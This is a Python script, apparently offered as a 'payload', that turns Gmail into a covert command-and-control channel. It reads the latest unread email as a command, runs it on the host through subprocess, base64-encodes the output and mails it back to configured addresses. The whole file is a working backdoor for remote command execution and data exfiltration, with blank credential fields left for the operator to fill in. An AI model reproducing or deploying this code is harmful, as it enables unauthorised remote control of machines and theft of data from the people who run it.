#!/bin/env python

import imaplib
import smtplib
import email
import subprocess
import base64
import multiprocessing


email_add = '' # Gmail of this payload
password = '' # Password of this Gmail
email_to = [''] # Gmails to send the output


def mail():
    try:
        mail = imaplib.IMAP4_SSL('imap.gmail.com')
        mail.login(email_add, password)

        mail.select('inbox')

        result, data = mail.uid('search', None, 'UnSeen')

        latest_email_uid = data[0].split()[-1]
        result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
        raw_email = data[0][1]
        msg = email.message_from_bytes(raw_email)
        hdr = email.header.make_header(email.header.decode_header(msg['Subject']))
        subject = str(hdr)

        for part in msg.walk():
            body = part.get_payload(decode=True)
            if body is not None:
                break
        return body.decode()
    except Exception or IndexError:
        return 0

def send(data):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_add, password)
        server.sendmail(email_add, email_to, str(data).encode())
    except:
        pass

def main():
    command = mail()
    if isinstance(command, str):
        try:
            command = command.replace('\r', '').replace('\n', '')
            command_output = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
            text = f"Output: {command_output}"
            payload = base64.b64encode(text.encode())
            send(payload)

        except FileNotFoundError:
            pass
    else:
        pass

if __name__ == '__main__':
    proc_one = multiprocessing.Process(target=main)
    proc_one.start()
